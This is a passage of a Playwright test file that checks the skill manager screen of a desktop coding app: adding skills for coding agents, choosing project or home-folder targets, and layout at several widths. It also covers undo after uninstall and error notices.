    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('');
    await expect(dialog.locator('#skill-add-target-hint')).toHaveText('Into each agent’s home folder, like ~/.claude/skills.');
    await expect(dialog.getByRole('combobox', { name: 'Install to' })).toHaveAccessibleDescription('Into each agent’s home folder, like ~/.claude/skills.');
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-1');
    // Agents installed on this computer start checked; the others are listed unchecked and marked.
    const agents = dialog.getByRole('group', { name: 'Agents' });
    await expect(agents.getByRole('checkbox')).toHaveCount(5);
    await expect(agents.getByRole('checkbox', { checked: true })).toHaveCount(3);
    await expect(agents.getByRole('checkbox', { name: 'Kimi Code app missing', exact: true })).not.toBeChecked();
    await expect(agents.getByRole('checkbox', { name: 'DeepSeek and Muse Code apps missing', exact: true })).not.toBeChecked();
    await expect(agents.locator('.skill-add-check', { hasText: 'Kimi Code' }).locator('.skill-add-missing')).toHaveText('app missing');
    await dialog.getByRole('checkbox', { name: 'OpenCode' }).uncheck();
    const readsBefore = await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_list').length);
    await dialog.getByRole('button', { name: 'Install 1 skill' }).click();
    await expect(dialog).toBeHidden();
    // No list read around the install: the page's list words the note and the add response refreshes it.
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_list').length)).toBe(readsBefore);
    await expect(row(page, 'vercel-deploy')).toBeVisible();
    await expect(row(page, 'vercel-deploy').locator('.skill-chip-project')).toHaveText('This project');
    await expect(row(page, 'vercel-deploy').locator('.skill-chip')).toHaveCount(2);
    await expect(summary(page)).toContainText('Installed 1 skill for Claude Code and Codex.');
    await expect(page.locator('.skill-manager-bar [data-sm-add]')).toBeFocused();
  });

  test('a skills.sh link to one skill preselects only that skill; a repeat install says so', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    const source = dialog.getByRole('textbox', { name: 'Source' });
    await source.fill('https://skills.sh/vercel-labs/agent-skills/react-best-practices?ref=test');
    await source.press('Enter');
    await expect(dialog.getByRole('checkbox', { name: /react-best-practices/ })).toBeChecked();
    await expect(dialog.getByRole('checkbox', { name: /web-design-guidelines/ })).not.toBeChecked();
    await expect(dialog.getByRole('combobox', { name: 'Install to' })).toHaveValue('');
    await dialog.getByRole('checkbox', { name: 'Claude Code' }).uncheck();
    // Codex and OpenCode already have it in their home folders: marked, unchecked, still selectable.
    const pick = dialog.getByRole('checkbox', { name: /react-best-practices/ });
    await expect(pick).toHaveAccessibleName(/^react-best-practices Installed/);
    await expect(pick).not.toBeChecked();
    await pick.check();
    await dialog.getByRole('button', { name: 'Install 1 skill' }).click();
    await expect(dialog).toBeHidden();
    await expect(summary(page)).toContainText('Already installed.');
  });

  for (const width of [820, 1200]) for (const theme of ['light', 'dark'] as const) {
    test(`at ${width}px (${theme}) Add marks skills already installed at the chosen target`, async ({ page }) => {
      await page.setViewportSize({ width, height: 900 });
      await open(page, 2, false, theme);
      await page.getByRole('button', { name: 'Add skill' }).click();
      const dialog = page.getByRole('dialog', { name: 'Add skill' });
      await dialog.getByRole('textbox', { name: 'Source' }).fill('vercel-labs/agent-skills');
      await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
      const pick = dialog.locator('.skill-add-check', { hasText: 'react-best-practices' });
      // Claude Code doesn't have it yet, so with every agent chosen it isn't marked.
      await expect(pick.locator('.skill-add-installed')).toBeHidden();
      await expect(pick.getByRole('checkbox')).toBeChecked();
      await dialog.getByRole('checkbox', { name: 'Claude Code', exact: true }).uncheck();
      await expect(pick.locator('.skill-add-installed')).toHaveText('Installed');
      await expect(pick.getByRole('checkbox')).not.toBeChecked();
      await expect(dialog.getByRole('button', { name: 'Install 2 skills' })).toBeEnabled();
      await page.locator('.dialog-plate, #dialog').last().screenshot({ path: `test-results/skill-add-installed-${width}-${theme}.png` });
      // A box the user ticks stays as they left it when the agents change.
      await pick.getByRole('checkbox').check();
      await dialog.getByRole('checkbox', { name: 'OpenCode', exact: true }).uncheck();
      await expect(pick.getByRole('checkbox')).toBeChecked();
      // A project target looks at that project's folders only.
      await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-2');
      await expect(pick.locator('.skill-add-installed')).toBeHidden();
    });
  }

  test('Add reads a project target the page’s list doesn’t cover, once, to mark its skills', async ({ page }) => {
    await open(page);
    await page.evaluate(() => (window as any).__mock.add({ source: 'vercel-labs/agent-skills', skills: ['vercel-deploy'], harnesses: ['claude', 'codex', 'opencode'], projectId: 'project-2' }));
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(row(page, 'orbit-deploy')).toBeVisible();
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('vercel-labs/agent-skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    const deploy = dialog.locator('.skill-add-check', { hasText: 'vercel-deploy' });
    await expect(deploy.getByRole('checkbox')).toBeChecked();
    const reads = () => page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_list' && c.args.projectId === 'project-2').length);
    expect(await reads()).toBe(0);
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-2');
    await expect(deploy.locator('.skill-add-installed')).toBeVisible();
    await expect(deploy.getByRole('checkbox')).not.toBeChecked();
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-1');
    await expect(deploy.locator('.skill-add-installed')).toBeHidden();
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-2');
    await expect(deploy.locator('.skill-add-installed')).toBeVisible();
    expect(await reads()).toBe(1);
  });

  test('clearing a no-longer-installed skill in All projects clears every project’s switch too', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { skills: ['pdf', 'gone'].map(name => ({ name, description: `${name} skill`, source: null, switchable: true, agents: [{ harness: 'claude', scope: 'user', path: `~/.claude/skills/${name}` }] })) }; });
    await open(page);
    await page.evaluate(() => {
      const mock = (window as any).__mock;
      mock.set({ name: 'gone', enabled: false });
      mock.set({ name: 'gone', enabled: false, projectId: 'project-1' });
      mock.changeOnDisk('gone', { agents: [], missing: true });
    });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    // Held off in All projects: the project view sends there (Manage) rather than offering Clear.
    await expect(row(page, 'gone').locator('.skill-row-meta')).toHaveText(/^Not installed\s*Manage$/);
    await expect(row(page, 'gone').getByRole('button', { name: 'Clear the setting for gone' })).toHaveCount(0);
    // Manage opens All projects on the row; with no switch there, keyboard focus lands on its Clear.
    await row(page, 'gone').getByRole('button', { name: 'Manage in All projects' }).click();
    await expect(page.getByRole('radio', { name: 'All projects', exact: true })).toHaveAttribute('aria-checked', 'true');
    await expect(row(page, 'gone').getByRole('button', { name: 'Clear the setting for gone' })).toBeFocused();
    // Clear drops the setting, so the row leaves the list.
    await row(page, 'gone').getByRole('button', { name: 'Clear the setting for gone' }).click();
    await expect(row(page, 'gone')).toHaveCount(0);
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_set').at(-1).args)).toEqual({ name: 'gone', enabled: true });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(row(page, 'pdf')).toBeVisible();
    await expect(row(page, 'gone')).toHaveCount(0);
  });

  test('a no-longer-installed skill held off only by a project can be cleared from All projects', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { missingInProjects: { 'project-1': ['orbit-old'] } }; });
    await open(page);
    const gone = row(page, 'orbit-old');
    // Never a bare 'Not installed': Clear, and the tag naming the project that holds the setting.
    await expect(gone.locator('.skill-row-meta')).toHaveText(/^Not installed\s*Clear\s*Off in orbit$/);
    await expect(gone.getByRole('switch')).toHaveCount(0);
    // A leftover setting isn't a skill: the count holds installed skills only.
    await expect(summary(page)).toHaveText(/^13 skills$/);
    await gone.getByRole('button', { name: 'Clear the setting for orbit-old' }).click();
    await expect(gone).toHaveCount(0);
    expect(await page.evaluate(() => (window as any).__calls.filter((c: any) => c.command === 'skill_manager_set').at(-1).args)).toEqual({ name: 'orbit-old', enabled: true });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(row(page, 'pdf')).toBeVisible();
    await expect(row(page, 'orbit-old')).toHaveCount(0);
  });

  test('a Claude-family harness shows native’s console note in the details', async ({ page }) => {
    await open(page);
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    const items = row(page, 'pdf').getByRole('list', { name: 'Installed for' }).getByRole('listitem');
    await expect(items.nth(0).locator('.skill-detail-note')).toHaveText('Typed /commands still run in the console');
    await expect(items.nth(1).locator('.skill-detail-note')).toHaveCount(0);
  });

  test('agent chips name their agents on every row or on none, never row by row', async ({ page }) => {
    await page.setViewportSize({ width: 1400, height: 900 });
    await page.addInitScript(skills => { (window as any).__mockOptions = { skills }; }, TWO_CHIP_SKILLS);
    await open(page);
    const claude = row(page, 'pdf').getByRole('img', { name: 'Claude Code', exact: true });
    const body = page.locator('.skill-manager-body');
    // Rows with a tag (a project chip) keep logos only at every width; the rest decide together.
    const names = () => page.locator('.skill-row:not([data-compact]) .skill-chip:not([data-missing]) .skill-chip-name').evaluateAll(all => [...new Set(all.map(n => getComputedStyle(n).display !== 'none'))]);
    // Narrower than 680px: logos only, on every row (even one- and two-chip rows), names in tooltips and labels.
    await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = '640px'; });
    await expect(claude.locator('.skill-chip-name')).toBeHidden();
    expect(await names()).toEqual([false]);
    await expect(claude).toHaveAccessibleName('Claude Code');
    await expect(claude).toHaveAttribute('data-tip', 'Claude Code');
    expect(await page.locator('.skill-row-tags').evaluateAll(groups => groups.filter(g => g.firstElementChild && g.lastElementChild!.getBoundingClientRect().right - g.firstElementChild.getBoundingClientRect().left > g.clientWidth + 1).length)).toBe(0);
    // Wide, with at most two chips a row: every row names its agents.
    await page.evaluate(() => { document.getElementById('host')!.style.maxWidth = 'none'; });
    await expect(body).toHaveAttribute('data-names', '');
    await expect(claude.locator('.skill-chip-name')).toHaveText('Claude Code');
    await expect(claude.locator('.skill-chip-name')).toBeVisible();
    expect(await names()).toEqual([true]);
    await expect(claude).toHaveAccessibleName('Claude Code');
    // Names never leave a description under 60% of its row.
    const shares = await page.locator('.skill-row:not([data-compact]) > .ds-row').evaluateAll(rows => rows.map(r => r.querySelector('.skill-row-lead')!.clientWidth / r.clientWidth));
    expect(Math.min(...shares)).toBeGreaterThanOrEqual(0.6);
    await page.locator('.skill-manager').screenshot({ path: 'test-results/skill-manager-wide-names.png' });
    // One row gains a third agent: the whole view goes back to logos.
    await page.evaluate(() => (window as any).__mock.changeOnDisk('pdf', { agents: [
      { harness: 'claude', scope: 'user', path: '~/.claude/skills/pdf' }, { harness: 'codex', scope: 'user', path: '~/.codex/skills/pdf' }, { harness: 'opencode', scope: 'user', path: '~/.config/opencode/skills/pdf' },
    ] }));
    await page.getByRole('radio', { name: 'orbit' }).click();
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await expect(row(page, 'pdf').locator('.skill-chip')).toHaveCount(3);
    await expect(body).not.toHaveAttribute('data-names', '');
    expect(await names()).toEqual([false]);
  });

  test('an install that finishes after its dialog closed leaves a newer dialog alone', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await delay(page, 'skill_manager_add', [900]);
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await page.keyboard.press('Escape');
    await expect(dialog).toBeHidden();
    await page.getByRole('button', { name: 'Add skill' }).click();
    await expect(dialog).toBeVisible();
    await dialog.getByRole('textbox', { name: 'Source' }).fill('typing');
    await expect(row(page, 'xlsx')).toBeVisible({ timeout: 3000 });
    await expect(dialog).toBeVisible();
    await expect(dialog.getByRole('textbox', { name: 'Source' })).toHaveValue('typing');
    await expect(dialog.getByRole('alert')).toBeHidden();
  });

  test('installing into another scope reloads the displayed list once', async ({ page }) => {
    await open(page);
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await dialog.getByRole('combobox', { name: 'Install to' }).selectOption('project-1');
    const before = await page.evaluate(() => (window as any).__calls.length);
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog).toBeHidden();
    await expect(row(page, 'xlsx')).toBeVisible();
    await expect(row(page, 'xlsx').locator('.skill-chip-project')).toHaveText('orbit');
    expect(await page.evaluate(start => (window as any).__calls.slice(start).map((c: any) => [c.command, c.args.projectId ?? null]), before)).toEqual([
      ['skill_manager_add', 'project-1'], ['skill_manager_list', null],
    ]);
    // The page's list (All projects covers every target) worded the note; nothing was read before the add.
    await expect(summary(page)).toContainText('Installed 2 skills for Claude Code, Codex and OpenCode.');
    await expect(page.getByRole('radio', { name: 'All projects', exact: true })).toHaveAttribute('aria-checked', 'true');
  });

  test('an empty inventory offers Add skill; a search without matches offers to clear it', async ({ page }) => {
    await open(page, 2, true);
    await expect(page.getByText('No skills installed yet')).toBeVisible();
    await expect(summary(page)).toHaveText('0 skills');
    await expect(page.locator('[data-sm-enforcement]')).toBeHidden();
    const add = page.locator('.skill-manager-empty').getByRole('button', { name: 'Add skill' });
    await expect(add).toBeVisible();
    await add.click();
    await expect(page.getByRole('dialog', { name: 'Add skill' })).toBeVisible();
    await page.keyboard.press('Escape');
    await open(page);
    await page.getByRole('searchbox', { name: 'Search skills' }).fill('zzz');
    await expect(page.getByRole('button', { name: 'Clear search' })).toBeVisible();
    await page.getByRole('button', { name: 'Clear search' }).click();
    await expect(page.locator('.skill-row')).toHaveCount(13);
  });
  test('agent targets name every agent sharing a CLI id, including DeepSeek and Muse Code', async ({ page }) => {
    await open(page);
    await page.evaluate(async () => {
      (window as any).__roster = [
        { id: 'claude', installed: true, enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'claude-code' },
        { id: 'glm', installed: true, enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'claude-code' },
        { id: 'mimo', installed: true, enforcement: 'blocked', consoleEnforcement: 'blocked', installable: true, installAs: 'claude-code' },
        { id: 'zcode', installed: true, enforcement: 'asked', consoleEnforcement: 'asked', installable: true, installAs: 'zcode' },
        { id: 'pi', installed: true, enforcement: 'asked', consoleEnforcement: 'asked', installable: true, installAs: 'pi' },
        { id: 'omp', installed: true, enforcement: 'asked', consoleEnforcement: 'asked', installable: true, installAs: 'pi' },
        { id: 'deepseek', installed: true, enforcement: 'asked', consoleEnforcement: 'asked', installable: true, installAs: 'universal' },
        { id: 'muse', installed: true, enforcement: 'asked', consoleEnforcement: 'asked', installable: true, installAs: 'universal' },
        { id: 'kimi', installed: false, enforcement: 'asked', consoleEnforcement: 'none', installable: false },
      ];
      const { mountSkillManager } = await import('/src/skill-manager.ts' as string);
      const { createPreviewSkillManager } = await import('/src/preview-skill-manager.ts' as string);
      const mock = createPreviewSkillManager();
      const methods: any = { skill_manager_list: 'list', skill_manager_set: 'set', skill_manager_reset: 'reset', skill_manager_preview: 'preview', skill_manager_add: 'add' };
      mountSkillManager(document.getElementById('host')!, { call: async (command: string, args: any = {}) => {
        if (command === 'skill_manager_add') (window as any).__lastArgs = args;
        const result = await (mock as any)[methods[command]](args);
        return { ...result, harnesses: (window as any).__roster };
      } });
    });
    await expect(page.getByRole('img', { name: 'How switches work' })).toHaveAttribute('data-tip', 'Switches apply in PandaCode, for the scope picked here. Agents PandaCode runs follow them from the next turn; files stay installed.');
    await page.getByRole('button', { name: 'Add skill' }).click();
    const dialog = page.getByRole('dialog', { name: 'Add skill' });
    await dialog.getByRole('textbox', { name: 'Source' }).fill('anthropics/skills');
    await dialog.getByRole('textbox', { name: 'Source' }).press('Enter');
    await expect(dialog.getByRole('group', { name: 'Agents' }).getByRole('checkbox')).toHaveCount(4);
    await expect(dialog.getByRole('checkbox', { name: 'DeepSeek and Muse Code', exact: true })).toBeChecked();
    await expect(dialog.getByRole('checkbox', { name: 'Kimi Code', exact: true })).toHaveCount(0);
    await expect(dialog.getByRole('checkbox', { name: 'Claude Code, GLM and MiMo', exact: true })).toBeChecked();
    await expect(dialog.getByRole('checkbox', { name: 'Pi and Oh My Pi', exact: true })).toBeChecked();
    await expect(dialog.getByRole('checkbox', { name: 'ZCode' })).toBeChecked();
    await dialog.getByRole('button', { name: 'Install 2 skills' }).click();
    await expect(dialog).toBeHidden();
    expect(await page.evaluate(() => (window as any).__lastArgs.harnesses)).toEqual(['claude', 'glm', 'mimo', 'zcode', 'pi', 'omp', 'deepseek', 'muse']);
  });

  test('the settings warning puts its icon beside the title and the native detail in small text', async ({ page }) => {
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Skill settings file is unreadable.' }; });
    await open(page);
    const card = page.locator('[data-sm-warning]');
    const icon = (await card.locator('.skill-manager-warning-icon').boundingBox())!;
    const title = card.getByText('Couldn’t read skill settings');
    const titleBox = (await title.boundingBox())!;
    expect(icon.x + icon.width).toBeLessThanOrEqual(titleBox.x);
    expect(Math.abs((icon.y + icon.height / 2) - (titleBox.y + titleBox.height / 2))).toBeLessThan(2);
    const size = (selector: string) => card.locator(selector).first().evaluate(el => parseFloat(getComputedStyle(el).fontSize));
    const detail = await size('.skill-manager-warning-detail');
    expect(detail).toBeLessThan(await size('strong'));
    expect(detail).toBe(await size('.skill-manager-warning-body p'));
  });

  test('the scope picker is a labelled filter, not a second tab row', async ({ page }) => {
    await open(page);
    await expect(page.locator('.skill-manager-scope-label')).toHaveText('Show skills for');
    await expect(page.locator('.skill-manager-scope-label')).toBeVisible();
    const group = page.getByRole('radiogroup', { name: 'Show skills for' });
    await expect(group).not.toHaveClass(/ds-seg/);
    await expect(group.locator('.segment-thumb')).toHaveCount(0);
    // Separate pills: a gap between options, and the checked one carries its own fill.
    const [first, second] = [(await group.getByRole('radio').nth(0).boundingBox())!, (await group.getByRole('radio').nth(1).boundingBox())!];
    expect(second.x - (first.x + first.width)).toBeGreaterThanOrEqual(3);
    expect(first.height).toBeLessThan((await page.getByRole('searchbox', { name: 'Search skills' }).boundingBox())!.height);
    await group.getByRole('radio', { name: 'All projects' }).focus();
    await page.keyboard.press('ArrowRight');
    await expect(group.getByRole('radio', { name: 'orbit' })).toBeFocused();
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    await open(page, 3);
    await expect(page.locator('label.skill-manager-scope-field')).toContainText('Show skills for');
  });

  test('project badges fit a whole project name and truncate only when needed', async ({ page }) => {
    await page.setViewportSize({ width: 1200, height: 900 });
    await open(page);
    const name = row(page, 'tauri-ipc').locator('.skill-chip-project>span');
    await expect(name).toHaveText('pandacode');
    expect(await name.evaluate(el => el.scrollWidth <= el.clientWidth)).toBe(true);
  });

  test('a locked switch keeps a visible track beside its lock', async ({ page }) => {
    await open(page);
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await page.getByRole('radio', { name: 'orbit' }).click();
    const locked = toggle(page, 'pdf', 'orbit');
    await expect(locked).toBeDisabled();
    expect(await locked.evaluate(el => getComputedStyle(el).opacity)).toBe('1');
    expect(await locked.evaluate(el => getComputedStyle(el).boxShadow)).not.toBe('none');
    // It reads as locked, not as a live switch: a lock glyph where the knob would be, and the not-allowed cursor.
    expect(await locked.evaluate(el => getComputedStyle(el).cursor)).toBe('not-allowed');
    expect(await locked.evaluate(el => { const knob = getComputedStyle(el, '::before'); return knob.maskImage || knob.webkitMaskImage; })).toContain('svg');
    expect(await toggle(page, 'frontend-design', 'orbit').evaluate(el => { const knob = getComputedStyle(el, '::before'); return knob.maskImage || knob.webkitMaskImage; })).toBe('none');
    await expect(row(page, 'pdf').locator('.skill-row-meta .icon')).toBeVisible();
  });

  test('details keep each location’s scope and enforcement on one line at a narrow width', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 900 });
    await open(page);
    await page.locator('#host').evaluate(el => { el.style.maxWidth = '600px'; });
    await row(page, 'pdf').locator('[data-sm-expand]').click();
    const small = row(page, 'pdf').locator('.skill-detail-harness small').first();
    await expect(small).toHaveText('User · Won’t load when off');
    const { height, line } = await small.evaluate(el => ({ height: el.getBoundingClientRect().height, line: parseFloat(getComputedStyle(el).lineHeight) || parseFloat(getComputedStyle(el).fontSize) * 1.5 }));
    expect(height).toBeLessThan(line * 1.5);
    // Paths line up in one column across locations and the source.
    const paths = await row(page, 'pdf').locator('.skill-detail-table code').evaluateAll(els => els.map(el => Math.round(el.getBoundingClientRect().x)));
    expect(new Set(paths).size).toBe(1);
    // Narrow, the label column holds only the agent's name, so each path sits close beside it (the column gap past the
    // longest name); scope and enforcement, then the console caveat, take full-width lines under the location, and
    // paths wrap after a slash, never mid-name.
    const label = (await row(page, 'pdf').locator('.skill-detail-name').first().boundingBox())!;
    const rem = await page.evaluate(() => parseFloat(getComputedStyle(document.documentElement).fontSize));
    expect(label.width).toBeLessThanOrEqual(12 * rem);
    const names = await row(page, 'pdf').locator('.skill-detail-name').evaluateAll(els => Math.max(...els.map(el => el.getBoundingClientRect().right)));
    const firstPath = (await row(page, 'pdf').locator('.skill-detail-table code').first().boundingBox())!;
    expect(firstPath.x - names).toBeLessThanOrEqual(12);
    const scope = (await small.boundingBox())!;
    expect(Math.round(scope.x)).toBe(Math.round(label.x));
    expect(scope.y).toBeGreaterThanOrEqual(label.y + label.height - 1);
    const note = (await row(page, 'pdf').locator('.skill-detail-note').first().boundingBox())!;
    const path = (await row(page, 'pdf').locator('.skill-detail-table code').first().boundingBox())!;
    expect(Math.round(note.x)).toBe(Math.round(label.x));
    expect(note.y).toBeGreaterThanOrEqual(path.y + path.height - 1);
    await expect(row(page, 'pdf').locator('.skill-detail-table code').first().locator('wbr')).not.toHaveCount(0);
  });

  test('after a switch changes, the summary line says switches apply from the next turn, without moving a row', async ({ page }) => {
    await open(page);
    const note = page.locator('.skill-manager-applies');
    await expect(note).toBeHidden();
    const before = await rowTops(page);
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await expect(note).toBeVisible();
    await expect(note).toHaveText('Applies from the next turn');
    await expect(summary(page)).toHaveText('13 skills · 1 off in all projects');
    expect(await rowTops(page)).toEqual(before);
    // On the summary line, whole: never a line of its own, never cut mid-word.
    const line = (await note.boundingBox())!, top = (await summary(page).boundingBox())!;
    expect(Math.abs(line.y - top.y)).toBeLessThan(4);
    expect(await note.evaluate(el => el.scrollWidth <= el.clientWidth + 1)).toBe(true);
    // Where it doesn't fit beside the counts it steps out of sight rather than adding a line (the scope's info mark
    // says the same); the rows stay where they were.
    await page.locator('#host').evaluate(el => { el.style.maxWidth = '420px'; });
    const narrow = await rowTops(page);
    await toggle(page, 'docx').uncheck();
    await expect(toggle(page, 'docx')).not.toHaveAttribute('aria-busy', 'true');
    expect(await rowTops(page)).toEqual(narrow);
    const slot = (await page.locator('.skill-manager-applies-slot').boundingBox())!;
    const shown = (await note.boundingBox())!;
    expect(shown.y >= slot.y + slot.height - 1 || shown.x + shown.width <= slot.x + slot.width + 1).toBe(true);
  });

  test('at 820px a May still load flip keeps the summary on one line and the rows still', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 900 });
    await page.addInitScript(() => { (window as any).__overrides = { pdf: { claude: { enforcement: 'asked', consoleEnforcement: 'asked' } } }; });
    await open(page);
    const note = page.locator('.skill-manager-applies');
    const oneLine = async () => {
      const head = (await page.locator('.skill-manager-head').boundingBox())!, text = (await summary(page).boundingBox())!;
      expect(text.height).toBeLessThan(head.height + 1);
      return head.height;
    };
    const height = await oneLine();
    const before = await rowTops(page);
    await toggle(page, 'pdf').uncheck();
    await expect(toggle(page, 'pdf')).not.toHaveAttribute('aria-busy', 'true');
    await expect(summary(page)).toHaveText('13 skills · 1 off in all projects (1 may still load)');
    await expect(note).toBeVisible();
    expect(await oneLine()).toBeCloseTo(height, 0);
    expect(await rowTops(page)).toEqual(before);
    // Hidden, the note's slot takes no width: nothing beside the summary but its own words.
    await page.getByRole('radio', { name: 'orbit' }).click();
    await expect(note).toBeHidden();
    expect((await page.locator('.skill-manager-applies-slot').boundingBox())?.width ?? 0).toBe(0);
  });

  test('an uninstall never moves the rows above it: Undo floats at the bottom of the view', async ({ page }) => {
    await page.setViewportSize({ width: 1000, height: 600 });
    await open(page);
    const before = await rowTops(page);
    const docx = row(page, 'docx');
    await docx.locator('[data-sm-expand]').click();
    await docx.getByRole('button', { name: 'Uninstall docx…' }).click();
    await docx.getByRole('button', { name: 'Uninstall', exact: true }).click();
    const undone = page.locator('[data-sm-undone]');
    await expect(undone.getByRole('button', { name: 'Undo uninstalling docx' })).toBeFocused();
    const after = await rowTops(page);
    for (const name of ['brand-guidelines', 'changelog']) expect(after[name]).toBe(before[name]);
    // It floats inside the viewport (sticky), over the list's lower edge.
    const float = (await page.locator('[data-sm-float]').boundingBox())!;
    expect(float.y + float.height).toBeLessThanOrEqual(600);
    const list = (await page.locator('.skill-manager-list').boundingBox())!;
    expect(float.y).toBeLessThan(list.y + list.height);
    await page.locator('.skill-manager').screenshot({ path: 'test-results/skill-manager-undo-float.png' });
    await undone.getByRole('button', { name: 'Undo uninstalling docx' }).click();
    await expect(page.locator('[data-sm-float]')).toBeHidden();
    await expect(row(page, 'docx')).toBeVisible();
  });

  test('at 820px the floating Undo reserves its height: rows reached by keyboard and the last row stay clear of it', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 700 });
    const settings = await openSettingsPage(page, 'Skills');
    await expect(row(page, 'pdf')).toBeVisible();
    const scroller = settings.locator('.settings-content');
    const docx = row(page, 'docx');
    await docx.locator('[data-sm-expand]').click();
    await docx.getByRole('button', { name: 'Uninstall docx…' }).click();
    await docx.getByRole('button', { name: 'Uninstall', exact: true }).click();
    const float = page.locator('[data-sm-float]');
    await expect(float).toBeVisible();
    const height = (await float.boundingBox())!.height;
    expect(parseFloat(await scroller.evaluate(el => (el as HTMLElement).style.scrollPaddingBottom))).toBeGreaterThanOrEqual(height);
    const covered = () => page.evaluate(() => {
      const f = document.querySelector('[data-sm-float]')!.getBoundingClientRect();
      return [...document.querySelectorAll('.skill-row .ds-row-title, .skill-row .ds-row-sub')].filter(t => { const r = t.getBoundingClientRect(); return r.bottom > f.top && r.top < f.bottom && r.right > f.left && r.left < f.right; }).length;
    });
    // A row under the line that takes focus scrolls clear of it (browsers don't scroll a partly visible control on
    // focus; WebKit's Tab skips buttons by default, so focus it directly).
    await scroller.evaluate(el => { el.scrollTop = 0; });
    const under = await page.evaluate(() => {
      const f = document.querySelector('[data-sm-float]')!.getBoundingClientRect();
      return [...document.querySelectorAll<HTMLElement>('.skill-row')].find(r => { const b = r.querySelector('.skill-row-body')!.getBoundingClientRect(); return b.bottom > f.top + 4 && b.top < f.bottom; })?.dataset.id ?? '';
    });
    expect(under).not.toBe('');
    await row(page, under).locator('[data-sm-expand]').focus();
    const text = (await row(page, under).locator('.skill-row-body').boundingBox())!, line = (await float.boundingBox())!;
    expect(text.y + text.height).toBeLessThanOrEqual(line.y);
    // At the end of the list the last row rests clear of it.
    await scroller.evaluate(el => { el.scrollTop = el.scrollHeight; });
    expect(await covered()).toBe(0);
    await page.screenshot({ path: 'test-results/skill-manager-undo-820.png' });
    await float.getByRole('button', { name: 'Undo uninstalling docx' }).click();
    await expect(float).toBeHidden();
    expect(await scroller.evaluate(el => (el as HTMLElement).style.scrollPaddingBottom)).toBe('');
  });

  test('a save that fails after the scope changed still says so, naming the skill and its scope', async ({ page }) => {
    await open(page);
    await page.evaluate(() => { (window as any).__failAfterScopeChange = true; });
    // The mock holds this save until the picker leaves All projects, then rejects it.
    await toggle(page, 'pdf').uncheck();
    await page.getByRole('radio', { name: 'orbit' }).click();
    await expect(toggle(page, 'pdf', 'orbit')).toBeVisible();
    const failed = page.locator('[data-sm-save-error]');
    await expect(failed).toHaveText(/Couldn’t turn pdf off in all projects: disk full/);
    await expect(failed).toHaveAttribute('role', 'alert');
    // Back in All projects, the switch shows what was saved.
    await page.getByRole('radio', { name: 'All projects', exact: true }).click();
    await expect(toggle(page, 'pdf')).toBeChecked();
    await failed.getByRole('button', { name: 'Dismiss' }).click();
    await expect(failed).toBeHidden();
    await expect(page.locator('[data-sm-float]')).toBeHidden();
  });

  test('stacked notices share one compact area, so the list still starts near the top', async ({ page }) => {
    await page.setViewportSize({ width: 820, height: 900 });
    await page.addInitScript(() => { (window as any).__mockOptions = { prefsError: 'Skill settings file is unreadable: expected value at line 1 column 1.', linksWarning: 'Couldn’t put back 1 skill link: ~/.claude/skills/pdf.' }; });
    await open(page);
    await page.evaluate(() => { (window as any).__fail = 'skill_manager_list'; });
    await page.getByRole('radio', { name: 'orbit', exact: true }).click();
    await expect(page.locator('[data-sm-load-error]')).toContainText('Couldn’t load skills for orbit.');
    const area = page.locator('[data-sm-notices]');
    for (const part of ['[data-sm-warning]', '[data-sm-notice]', '[data-sm-load-error]']) {
      await expect(area.locator(part)).toBeVisible();
    }
    const bar = (await page.locator('.skill-manager-bar').boundingBox())!, list = (await page.locator('.skill-manager-list').boundingBox())!;
    await page.locator('.skill-manager').screenshot({ path: 'test-results/skill-manager-notices.png' });
    expect(list.y - (bar.y + bar.height)).toBeLessThan(240);
  });

  test('native’s links note shows as a calm line', async ({ page }) => {
